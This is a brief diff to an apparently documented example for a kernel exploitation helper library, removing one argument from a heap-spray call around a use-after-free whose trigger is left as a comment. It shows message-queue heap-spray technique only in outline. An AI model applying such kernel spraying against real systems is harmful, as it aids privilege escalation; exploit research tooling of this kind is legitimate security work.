@@ -30,7 +30,7 @@ int qids[N_SPRAY];
 char payload[PAYLOAD_SIZE];
 memset(payload, 'A', sizeof(payload));
 
-kpwn_spray_msg(qids, N_SPRAY, payload, sizeof(payload), 0);
+kpwn_spray_msg(qids, N_SPRAY, payload, sizeof(payload));
 // ... trigger UAF ...
 kpwn_free_msg(qids, N_SPRAY);
 ```
